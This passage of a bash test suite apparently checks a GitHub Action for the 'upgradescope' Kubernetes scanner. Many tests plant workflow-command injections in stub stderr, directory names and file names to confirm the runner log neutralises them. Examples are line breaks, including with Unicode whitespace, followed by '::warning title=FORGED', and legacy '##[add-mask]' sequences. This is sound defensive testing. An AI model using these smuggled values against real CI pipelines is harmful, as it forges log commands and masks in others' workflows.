  *) "$work/real/upgradescope" "\$@" ;;
esac
EOF
chmod +x "$work/old/upgradescope"
run scan "$work/old:"
expect "a v0.1.x upgradescope still gates" 2 "cannot write the step summary"
for kv in verdict=blocked score=50 ready=false blockers=2 warnings=0 suppressed=0 new-blockers=2 new-warnings=0; do
  has "a v0.1.x upgradescope sets output $kv" "$rt/output" "$kv"
done
hasnt "a v0.1.x upgradescope sets no summary-file" "$rt/output" "summary-file="
hasnt "a v0.1.x upgradescope sets no output to null" "$rt/output" "=null"
has "a v0.1.x blocker annotation has no file" "$work/out" "::error title=upgradescope blocker (removed-api)::networking.k8s.io/v1beta1 Ingress removed in 1.22"
run scan "$work/old:" INPUT_PATH=action/testdata/clean
has "a v0.1.x clean scan sets verdict=ready" "$rt/output" "verdict=ready"
# Not ready without a blocker (v0.2's unknown) is neither ready nor blocked.
run scan "$work/old:" INPUT_PATH=action/testdata/clean STUB_REPORT='del(.verdict) | .ready = false'
has "a v0.1.x not-ready report without blockers sets verdict=unknown" "$rt/output" "verdict=unknown"
# Warning findings (the stub's JSON relabels the fixture's blockers) are
# ::error when fail-on warning makes them fail the gate, else ::warning.
run scan "$work/old:" INPUT_FAIL_ON=warning STUB_REPORT='.findings |= map(.severity = "warning")'
has "fail-on warning annotates a warning as an error" "$work/out" "::error file=action/testdata/removed/all.yaml,line=2,title=upgradescope warning (removed-api)::"
run scan "$work/old:" STUB_REPORT='.findings |= map(.severity = "warning")'
has "fail-on blocker annotates a warning as a warning" "$work/out" "::warning file=action/testdata/removed/all.yaml,line=2,title=upgradescope warning (removed-api)::"

# A failing JSON or Markdown pass: its stderr goes into one ::warning, so a
# later stderr line cannot be read as a workflow command.
mkdir -p "$work/noisy"
cat >"$work/noisy/upgradescope" <<EOF
#!/usr/bin/env bash
case "\$*" in
  *"--output sarif"*) "$work/real/upgradescope" "\$@" ;;
  *) printf 'it broke\n::error::forged by stderr\n100%% sure\n' >&2; exit 1 ;;
esac
EOF
chmod +x "$work/noisy/upgradescope"
run scan "$work/noisy:"
expect "a failing JSON pass still gates" 2 "::warning::upgradescope --output json failed, so the outputs and annotations are not set: it broke%0A::error::forged by stderr%0A100%25 sure"
expect "a failing Markdown pass warns" 2 "cannot write the step summary (it predates --output markdown, added after v0.1.1): it broke%0A"
if grep -q '^::error::forged' "$work/out"; then fail "stderr cannot start a workflow command" "$work/out"; else ok "stderr cannot start a workflow command"; fi

# The gate pass's stderr repeats input values (the path, a file name under it)
# and the contents of files a fork PR controls. It reaches the log line by
# line behind a prefix, so none of it can start a workflow command (#197
# AC-05b), and it is printed whatever the exit status.
mkdir -p "$work/loud"
cat >"$work/loud/upgradescope" <<EOF
#!/usr/bin/env bash
case "\$*" in
  *"--output sarif"*)
    printf 'gate says hi\n::error::forged by the gate\n::add-mask::secret\r::warning::cr\n100%% sure\n' >&2
    exec "$work/real/upgradescope" "\$@" ;;
  *) exec "$work/real/upgradescope" "\$@" ;;
esac
EOF
chmod +x "$work/loud/upgradescope"
loud_ok() { # <name>: the gate's stderr is in the log and starts no command
  if grep -qF 'gate says hi' "$work/out" && grep -qF '| ::error::forged by the gate' "$work/out" &&
    grep -qF '%0D::warning::cr' "$work/out" && ! grep -q '^::\(error\|warning\|add-mask\)::\(forged\|secret\|cr\)' "$work/out"; then ok "$1"; else fail "$1" "$work/out"; fi
}
run scan "$work/loud:"
loud_ok "the gate's stderr cannot start a workflow command (gate failed, exit 2)"
run scan "$work/loud:" INPUT_PATH=action/testdata/clean
loud_ok "the gate's stderr cannot start a workflow command (gate passed)"
# A directory name with a line break, holding no manifests: the binary's
# "No Kubernetes manifests found under <path>" repeats the name.
evil="$work/evil${nl}::warning title=FORGED::y"
mkdir -p "$evil" && echo readme >"$evil/README"
run scan "$work/real:" INPUT_PATH="$evil"
if [ "$code" = 1 ] && grep -qF '| ::warning title=FORGED::y' "$work/out" && grep -qF 'no Kubernetes manifests found' "$work/out" &&
  [ "$(grep -c '^::' "$work/out")" = 1 ] && grep -q '^::error::upgradescope scan failed (exit 1)' "$work/out"; then
  ok "a path with a line break cannot start a command through the binary's error"
else fail "a path with a line break cannot start a command through the binary's error" "$work/out"; fi
# A file name a fork PR controls, in a malformed manifest.
badname="$work/bad"
mkdir -p "$badname" && printf 'a: [\n' >"$badname/b${nl}::warning title=FORGEDBAD::q.yaml"
run scan "$work/real:" INPUT_PATH="$badname"
if grep -q '^::warning title=FORGEDBAD' "$work/out"; then fail "a file name with a line break cannot start a command through the binary's warning" "$work/out"; else
  ok "a file name with a line break cannot start a command through the binary's warning"; fi
# The same file name in a finding: annotations and the Markdown report
# carry it too, escaped or with the line break turned into a space.
mdname="$work/md"
mkdir -p "$mdname" && cp action/testdata/removed/all.yaml "$mdname/m${nl}::warning title=FORGEDMD::z.yaml"
run scan "$work/real:" INPUT_PATH="$mdname"
if [ "$code" = 2 ] && ! grep -q '^::warning title=FORGEDMD' "$work/out"; then
  ok "a file name with a line break in a finding cannot start a command"
else fail "a file name with a line break in a finding cannot start a command" "$work/out"; fi

# Line breaks followed by whitespace other than space and tab: the runner's
# TrimStart strips all Unicode whitespace before it looks for ::, so a
# pattern for "a line that would start a command" misses some of it, and
# every line of the gate's stderr and of the Markdown report gets the
# prefix instead (#197 AC-05b). Each in a skipped file's name, in a finding's
# file name, and in the path input (the binary's error, and validate's).
i=0
for label in FF VT NBSP U+3000 U+0085; do
  case $label in
    FF) ws=$'\f' ;;
    VT) ws=$'\v' ;;
    NBSP) ws=$'\xc2\xa0' ;;
    U+3000) ws=$'\xe3\x80\x80' ;;
    U+0085) ws=$'\xc2\x85' ;;
  esac
  i=$((i + 1))
  d="$work/ws$i"
  mkdir -p "$d" && printf 'a: [\n' >"$d/b${nl}${ws}::warning title=FORGED::q.yaml"
  cp action/testdata/removed/all.yaml "$d/m${nl}${ws}::warning title=FORGED::z.yaml"
  run scan "$work/real:" INPUT_PATH="$d"
  forged "$work/out" >"$work/forged.case"
  if [ "$code" = 2 ] && grep -qF "| ${ws}::warning title=FORGED::q.yaml" "$work/out" &&
    grep -qF 'skipped' "$work/out" && [ ! -s "$work/forged.case" ]; then
    ok "a line break and $label in a file name cannot start a workflow command"
  else
    cat "$work/forged.case" >>"$work/out"
    fail "a line break and $label in a file name cannot start a workflow command" "$work/out"
  fi
  p="$work/wsp$i${nl}${ws}::warning title=FORGED::y"
  mkdir -p "$p" && echo readme >"$p/README"
  run scan "$work/real:" INPUT_PATH="$p"
  forged "$work/out" >"$work/forged.case"
  if [ "$code" = 1 ] && grep -qF 'no Kubernetes manifests found' "$work/out" && [ ! -s "$work/forged.case" ]; then
    ok "a line break and $label in the path input cannot start a workflow command"
  else
    cat "$work/forged.case" >>"$work/out"
    fail "a line break and $label in the path input cannot start a workflow command" "$work/out"
  fi
  run install "$work/stub-curl:" INPUT_PATH="does/not/exist${nl}${ws}::warning title=FORGED::y"
  forged "$work/out" >"$work/forged.case"
  if [ "$code" = 1 ] && grep -qF "path 'does/not/exist%0A${ws}::warning" "$work/out" && [ ! -s "$work/forged.case" ]; then
    ok "a line break and $label in a missing path input cannot start a workflow command"
  else
    cat "$work/forged.case" >>"$work/out"
    fail "a line break and $label in a missing path input cannot start a workflow command" "$work/out"
  fi
done

# The runner also reads a legacy command, ##[name], anywhere in a line that
# is not a :: command. So no line that is not a :: annotation may hold a ##[
# at all, wherever in the line a path or file name put it (#197 AC-05b). (A
# :: line is parsed whole as its own command first, so a ##[ in one of its
# values is inert.)
nolegacy() { # <name>: the log has no ##[ outside a :: line
  if grep -v '^::' "$work/out" | grep -qF '##['; then fail "$1" "$work/out"; else ok "$1"; fi
}
mkdir -p "$work/hash1/d##[add-mask]upgradescope" && echo readme >"$work/hash1/d##[add-mask]upgradescope/README"
run scan "$work/real:" INPUT_PATH="$work/hash1/d##[add-mask]upgradescope"
expect "a ##[ in the path input is still reported in the error" 1 "no Kubernetes manifests found under"
nolegacy "a ##[ in the path input cannot start a legacy command through the binary's error"
mkdir -p "$work/hash2" && printf 'a: [\n' >"$work/hash2/x##[warning title=FORGED]y.yaml"
run scan "$work/real:" INPUT_PATH="$work/hash2"
expect "a ##[ in a malformed file's name is still reported" 1 "skipped"
nolegacy "a ##[ in a skipped file's name cannot start a legacy command"
mkdir -p "$work/hash3" && cp action/testdata/removed/all.yaml "$work/hash3/m##[error title=MD]z.yaml"
run scan "$work/real:" INPUT_PATH="$work/hash3"
expect "a finding in a ##[ file is still in the Markdown report" 2 "### upgradescope: blocked"
nolegacy "a ##[ in a finding's file name cannot start a legacy command through the Markdown report"
has "the Markdown report in the step summary is unchanged" "$rt/summary" '##[error title=MD]'
# An echo of a value outside the gate's stderr: the latest release's tag
# from the redirect, when it is not a version.
run install "$work/stub-curl:" INPUT_VERSION=latest STUB_LATEST='x##[add-mask]y'
has "the unresolvable release is still reported" "$work/out" "cannot resolve the latest release (got '"
nolegacy "a ##[ in a release URL cannot start a legacy command"

mkdir -p "$work/broken"
printf '#!/bin/sh\necho "load knowledge base: boom" >&2\nexit 1\n' >"$work/broken/upgradescope"
chmod +x "$work/broken/upgradescope"
run scan "$work/broken:"
expect "a scan error is exit 1" 1 "load knowledge base: boom"
has "a scan error is in the summary" "$rt/summary" "upgradescope: scan failed (exit 1)"
# sarif-file means a complete SARIF (exit 0 or 2); after a scan error the
# file is empty, and an upload step guarded on sarif-file != '' must skip
# it, not fail with "Invalid SARIF" (#197 AC-02b).
hasnt "a scan error sets no sarif-file" "$rt/output" "sarif-file="
run scan "$work/real:" INPUT_PATH=action/testdata/clean
[ -s "$(output sarif-file)" ] && jq -e '.runs' "$(output sarif-file)" >/dev/null &&
  ok "a passing gate sets sarif-file to a complete SARIF" || fail "a passing gate sets sarif-file to a complete SARIF" "$rt/output"
run scan "$work/real:" INPUT_PATH=action/testdata/clean INPUT_CONFIG=action/testdata/baseline-cronjob.json
[ "$code" != 0 ] && [ -z "$(output sarif-file)" ] &&
  ok "a config that cannot load sets no sarif-file" || fail "a config that cannot load sets no sarif-file" "$work/out"

# Every run above: whatever the inputs, file names and binary printed, the
# only workflow commands in the log are run.sh's own.
if [ -s "$work/forged" ]; then fail "no run's log holds a workflow command run.sh did not write" "$work/forged"; else
  ok "no run's log holds a workflow command run.sh did not write"; fi

pass=$(grep -c '^ok' "$work/results" || true)
fail=$(grep -c '^FAIL' "$work/results" || true)
echo "action_test: $pass passed, $fail failed"
[ "$fail" -eq 0 ] && [ "$pass" -gt 0 ]
